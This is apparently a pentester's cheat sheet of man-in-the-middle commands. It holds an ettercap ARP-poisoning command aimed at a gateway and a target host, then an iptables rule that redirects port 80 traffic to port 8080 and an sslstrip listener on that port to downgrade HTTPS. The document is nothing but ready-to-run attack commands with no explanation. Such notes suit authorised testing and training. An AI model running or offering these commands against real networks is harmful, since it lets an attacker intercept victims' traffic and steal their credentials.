# General MITM

## ettercap
`/gateway/ /target/`
`ettercap -Ti eth0 -M arp:remote /192.168.20.1/ /192.168.20.11/`

# SSL Stripping
`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`

`sslstrip -l 8080`
